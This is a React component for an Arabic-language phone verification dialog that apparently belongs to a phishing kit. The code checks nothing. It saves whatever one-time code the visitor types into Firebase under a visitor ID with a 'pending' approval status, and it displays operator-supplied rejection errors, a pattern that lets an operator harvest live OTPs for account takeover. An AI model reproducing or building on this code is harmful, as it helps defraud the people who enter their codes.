"use client"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { ShieldCheck, Loader2 } from "lucide-react"
import { addData } from "@/lib/firebase"

interface PhoneOtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
  phoneCarrier: string
  onOtpSubmitted: () => void
  rejectionError: string
}

export function PhoneOtpDialog({
  open,
  onOpenChange,
  phoneNumber,
  phoneCarrier,
  onOtpSubmitted,
  rejectionError,
}: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [timeLeft, setTimeLeft] = useState(120)
  const inputRef = useRef<HTMLInputElement>(null)

  // Reset on open
  useEffect(() => {
    if (open) {
      setOtp("")
      setTimeLeft(120)
      setTimeout(() => inputRef.current?.focus(), 200)
    }
  }, [open])

  // Countdown
  useEffect(() => {
    if (!open) return
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [open])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtp(value)
  }

  const handleSubmit = async () => {
    if (otp.length < 4) return
    setIsSubmitting(true)

    const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null
    if (visitorId) {
      await addData({
        id: visitorId,
        phoneOtp: otp,
        phoneApproval: "pending",
      })
    }

    setIsSubmitting(false)
    onOtpSubmitted()
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-md p-0 overflow-hidden" dir="rtl">
        {/* Header */}
        <div className="bg-gradient-to-l from-[#1a5c85] to-[#2d7ba8] p-6 text-white text-center">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 mb-4">
            <ShieldCheck className="w-8 h-8" />
          </div>
          <DialogHeader>
            <DialogTitle className="text-xl text-white">رمز التحقق OTP</DialogTitle>
            <DialogDescription className="text-white/80 mt-1">
              تم إرسال رمز التحقق إلى {phoneNumber}
            </DialogDescription>
          </DialogHeader>
        </div>

        <div className="p-6 space-y-5">
          {/* Rejection error */}
          {rejectionError && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-center">
              <p className="text-sm text-red-700 font-medium">{rejectionError}</p>
            </div>
          )}

          {/* OTP Input */}
          <div className="space-y-2">
            <label className="text-sm font-semibold text-gray-700 block text-right">أدخل رمز التحقق</label>
            <Input
              ref={inputRef}
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={otp}
              onChange={handleOtpChange}
              maxLength={6}
              placeholder="------"
              className="h-14 text-center text-2xl font-bold tracking-[0.5em] border-2 focus:border-[#1a5c85]"
              dir="ltr"
            />
          </div>

          {/* Timer */}
          <div className="text-center text-sm text-gray-500">
            إعادة الإرسال خلال: <span className="font-semibold text-[#1a5c85]">{formatTime(timeLeft)}</span>
          </div>

          {/* Submit */}
          <Button
            onClick={handleSubmit}
            disabled={otp.length < 4 || isSubmitting}
            className="w-full h-12 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50"
          >
            {isSubmitting ? (
              <><Loader2 className="h-5 w-5 animate-spin ml-2" />جاري التحقق...</>
            ) : (
              "تأكيد"
            )}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  )
}
